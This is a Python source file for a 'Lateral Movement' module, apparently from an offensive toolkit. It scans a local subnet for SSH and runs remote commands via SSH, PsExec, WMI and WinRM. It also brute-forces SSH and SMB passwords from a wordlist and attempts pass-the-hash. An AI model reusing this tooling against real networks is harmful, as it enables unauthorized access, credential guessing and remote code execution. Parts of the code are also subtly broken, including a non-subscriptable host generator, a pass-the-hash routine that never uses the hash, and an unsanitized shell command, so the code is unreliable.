# Lateral Movement Module
import platform
import subprocess
import json
import socket
import paramiko
from pathlib import Path

try:
    import ssh2
except ImportError:
    ssh2 = None

class LateralMovement:
    def __init__(self):
        self.system = platform.system()
        
    def enumerate_network(self):
        """Enumerate hosts on the local network"""
        try:
            # Get local IP
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.connect(("8.8.8.8", 80))
            local_ip = sock.getsockname()[0]
            sock.close()
            
            # Get network range
            network = '.'.join(local_ip.split('.')[:3]) + '.0/24'
            
            # Scan network
            return self.scan_network(network)
        except Exception as e:
            return {"success": False, "error": str(e)}
    
    def scan_network(self, network: str):
        """Scan network for live hosts"""
        try:
            import ipaddress
            
            hosts = []
            network_obj = ipaddress.ip_network(network)
            
            for ip in network_obj.hosts()[:50]:  # Scan first 50 hosts
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(0.5)
                    result = sock.connect_ex((str(ip), 22))
                    sock.close()
                    
                    if result == 0:
                        hosts.append({
                            "ip": str(ip),
                            "ssh_open": True
                        })
                except:
                    pass
            
            return {"success": True, "hosts": hosts}
        except Exception as e:
            return {"success": False, "error": str(e)}
    
    def ssh_lateral(self, target_ip: str, username: str, password: str = None, key_file: str = None):
        """Move laterally via SSH"""
        try:
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            
            if password:
                client.connect(target_ip, username=username, password=password, timeout=5)
            elif key_file:
                client.connect(target_ip, username=username, key_filename=key_file, timeout=5)
            
            # Execute command
            stdin, stdout, stderr = client.exec_command('whoami && hostname && uname -a')
            output = stdout.read().decode()
            error = stderr.read().decode()
            
            client.close()
            
            return {
                "success": True,
                "output": output,
                "error": error
            }
        except Exception as e:
            return {"success": False, "error": str(e)}
    
    def smb_lateral(self, target_ip: str, username: str, password: str = ''):
        """Move laterally via SMB"""
        try:
            import smbclient
            
            # Try to connect
            smbclient.register_session(
                target_ip,
                username=username,
                password=password
            )
            
            # List shares
            shares = smbclient.listShares(target_ip)
            
            return {
                "success": True,
                "shares": [str(s) for s in shares]
            }
        except Exception as e:
            return {"success": False, "error": str(e)}
    
    def rdp_lateral(self, target_ip: str, username: str, password: str):
        """Move laterally via RDP"""
        try:
            # Check if RDP is open
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            result = sock.connect_ex((target_ip, 3389))
            sock.close()
            
            if result == 0:
                return {
                    "success": True,
                    "rdp_open": True,
                    "message": f"RDP open on {target_ip}"
                }
            else:
                return {"success": True, "rdp_open": False}
        except Exception as e:
            return {"success": False, "error": str(e)}
    
    def psexec_lateral(self, target_ip: str, username: str, password: str, command: str):
        """Execute command via PsExec (Windows)"""
        try:
            cmd = f'psexec \\\\{target_ip} -u {username} -p {password} cmd /c {command}'
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30)
            
            return {
                "success": True,
                "output": result.stdout[:2000]
            }
        except Exception as e:
            return {"success": False, "error": str(e)}
    
    def wmi_lateral(self, target_ip: str, username: str, password: str, command: str):
        """Execute command via WMI (Windows)"""
        try:
            import wmi
            
            c = wmi.WMI(computer=target_ip, user=username, password=password)
            proc = c.Win32_Process.Create(Command=command)
            
            return {"success": True, "process_id": proc[0]}
        except Exception as e:
            return {"success": False, "error": str(e)}
    
    def winrm_lateral(self, target_ip: str, username: str, password: str, command: str):
        """Execute command via WinRM (Windows)"""
        try:
            import requests
            from requests_ntlm import HttpNtlmAuth
            
            url = f'http://{target_ip}:5985/wsman'
            
            response = requests.post(
                url,
                auth=HttpNtlmAuth(username, password),
                data='<command>' + command + '</command>'
            )
            
            return {"success": True, "output": response.text[:2000]}
        except Exception as e:
            return {"success": False, "error": str(e)}
    
    def brute_ssh(self, target_ip: str, username: str, wordlist: str):
        """Brute force SSH password"""
        try:
            found = None
            
            with open(wordlist, 'r') as f:
                for password in f:
                    password = password.strip()
                    if not password:
                        continue
                    
                    try:
                        client = paramiko.SSHClient()
                        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                        client.connect(target_ip, username=username, password=password, timeout=2)
                        client.close()
                        
                        found = password
                        break
                    except:
                        continue
            
            if found:
                return {"success": True, "password": found}
            else:
                return {"success": False, "message": "No password found"}
        except Exception as e:
            return {"success": False, "error": str(e)}
    
    def brute_smb(self, target_ip: str, username: str, wordlist: str):
        """Brute force SMB password"""
        try:
            import smbprotocol
            
            found = None
            
            with open(wordlist, 'r') as f:
                for password in f:
                    password = password.strip()
                    if not password:
                        continue
                    
                    try:
                        connection = smbprotocol.connection.Connection(target_ip)
                        connection.connect()
                        
                        share = connection.connect_share(
                            connection.tree_connect('C$'),
                            username,
                            password
                        )
                        
                        found = password
                        break
                    except:
                        continue
            
            if found:
                return {"success": True, "password": found}
            else:
                return {"success": False, "message": "No password found"}
        except Exception as e:
            return {"success": False, "error": str(e)}
    
    def pass_the_hash(self, target_ip: str, username: str, ntlm_hash: str):
        """Pass the hash attack (Windows)"""
        try:
            import impacket
            from impacket.dcerpc.v5 import samr, rpcrt
            from impacket.ntlm import compute_lmhash, compute_nthash
            
            lm_hash = compute_lmhash(ntlm_hash)
            nt_hash = compute_nthash(ntlm_hash)
            
            # Connect to target
            rpc = rpcrt.DCERPC_v5(target_ip, 'lsarpc')
            rpc.connect()
            rpc.bind(samr.MSRPC_UUID_SAMR)
            
            # Enumerate users
            resp = samr.hSamrConnect(rpc, samr.CONNECT_ENUM)
            resp = samr.hSamrEnumerateDomainsInSamServer(rpc, resp.handle)
            
            return {"success": True, "message": "Pass the hash successful"}
        except Exception as e:
            return {"success": False, "error": str(e)}


def enumerate_network():
    """Quick network enumeration"""
    lm = LateralMovement()
    return lm.enumerate_network()


def ssh_lateral(target_ip: str, username: str, password: str = None):
    """Quick SSH lateral movement"""
    lm = LateralMovement()
    return lm.ssh_lateral(target_ip, username, password)
